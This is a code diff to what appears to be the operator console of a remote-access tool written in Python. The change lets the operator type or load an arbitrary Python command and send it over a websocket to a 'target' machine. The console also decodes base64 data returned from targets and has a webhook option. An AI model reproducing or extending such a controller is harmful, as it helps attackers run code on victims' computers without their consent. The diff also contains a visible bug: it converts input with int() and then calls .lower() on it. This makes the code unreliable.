@@ -287,6 +287,7 @@ class Main:
             ws.send(target)
 
             recv = ws.recv()
+
             data = base64.b64decode(json.loads(recv)["data"])
 
             f = io.BytesIO(data)
@@ -440,10 +441,20 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
             elif choice == 2:
                 while True:
                     try:
-                        uiprint("Type the filename below:")
-                        filename = input(f"{self.indent}>>")
-                        command = open(filename, "rb").read().decode()
+                        uiprint("Load from file?")
+                        choice = int(input(f"{self.indent}>>"))
+
+                        if choice.lower() in yes:
+                            uiprint("Type the filename below:")
+                            filename = input(f"{self.indent}>>")
+                            command = open(filename, "rb").read().decode()
+
+                        else:
+                            uiprint("Type the python command below:")
+                            command = input(f"{self.indent}>>")
+
                         break
+
                     except KeyboardInterrupt:
                         break
 
@@ -451,9 +462,9 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                         print(e)
                         uiprint("Invalid filename!", "error")
 
-                        self.send_command(command, target)
-                        uiprint("Sent!")
-                        time.sleep(1.2)
+                self.send_command(command, target)
+                uiprint("Sent!")
+                time.sleep(1.2)
 
             elif choice == 5:
                 uiprint("Enter your webhook below:")
